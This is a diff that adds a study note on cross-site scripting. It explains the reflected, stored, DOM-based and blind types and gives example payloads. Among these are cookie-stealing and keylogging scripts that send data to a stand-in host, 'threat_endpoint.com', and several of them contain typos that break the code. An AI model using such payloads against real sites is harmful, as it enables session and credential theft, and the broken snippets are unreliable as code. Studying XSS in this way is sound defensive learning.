@@ -1,0 +1,42 @@
+XSS - Cross-Site Scripting is classified as an injection attack where malicious javascript gets injected into a web application with the intention of being executed by other users.
+
+A payload within a XSS involves two parts, the intention is what you wish the JavaScript to do, and the modification is the changes to the code that have to be made to execute it.
+
+Potential XSS intentions include.
+	- Proof of Concept [<script>alert('XSS Worked')</script>] - ensuring that the XSS vulnerability exists
+	- Session Stealing [<script>fetch("https://threat_endpoint.com?cookie=" + bdoa(documents.cookie));</script>
+	- Key Logging      [<script>document.onkeypress = funcition(e) {fetch('https://threat_endpoint.com?key=' + btoa(e.key));</script>
+	- Business Logic   [<script>user.changeEmail('hacker@gmail.com');</script>
+
+**
+Types Of XSS
+**
+
+Reflected XSS
+	- When user supplied input is reflected in a websites HTML with improper / insufficient validation.
+	- You can test for reflected XSS by testing the following entry points
+		- Parameters in the URL query string
+		- URL File Path
+		- Sometimes HTTP Headers (unlikely exploitable in practice)
+
+Stored XSS
+	- When the XSS payload is stored on the web application, for example in a database like a support ticket, or user details.
+	- You can test for stored XSS by testing the following entry points
+		- Comments on a Blog
+		- User profile information
+		- Website Listings
+
+Sometimes developers limit the possible entries, such as a dropdown box on an age field. But instead of clicking on one of the options
+you instead send the request manually via a tool like burpsuite or potentially curl.
+
+DOM Based XSS
+	- DOM (Document Object Model) the programming interface utilised by HTML and XML. Document Based Programming.
+	- This type of cross site script is performed on the client-side when javascript code is executed after a user input 
+	  or interaction.
+
+Blind XSS
+	- Works similarly to a stored XSS but in this case you cannot see the payload working or test it against yourself
+	  such as a contact form.
+	- To ensure you know what is happening these types of attacks require the user to implement some form of HTTP
+	  callback.
+		- it is common to use a service such as burpcollaborator.net to receive the HTTP callbacks
